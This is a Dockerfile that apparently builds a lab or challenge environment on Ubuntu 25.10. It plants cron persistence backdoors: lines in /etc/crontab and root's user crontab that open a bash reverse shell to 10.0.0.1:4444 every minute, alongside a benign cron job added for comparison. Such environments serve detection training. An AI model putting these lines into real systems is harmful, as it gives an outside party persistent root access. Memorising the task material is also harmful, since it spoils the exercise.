FROM ubuntu:25.10
# Targets Ubuntu 25.10

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    cron \
    && rm -rf /var/lib/apt/lists/*

# Vulnerability: Add a crontab entry with a reverse shell backdoor.
# This runs every minute, attempting to connect back to an attacker's machine.
RUN echo '* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /etc/crontab

# Also plant a user-level crontab backdoor for root
RUN mkdir -p /var/spool/cron/crontabs && \
    echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /var/spool/cron/crontabs/root && \
    chmod 600 /var/spool/cron/crontabs/root && \
    chown root:crontab /var/spool/cron/crontabs/root

# Add a legitimate cron job for comparison
RUN echo '0 2 * * * root /usr/bin/apt-get update -q' >> /etc/crontab

# Create a test user
RUN useradd -m -s /bin/bash testuser

COPY verify.sh /opt/verify.sh
RUN chmod +x /opt/verify.sh

CMD ["sleep", "infinity"]
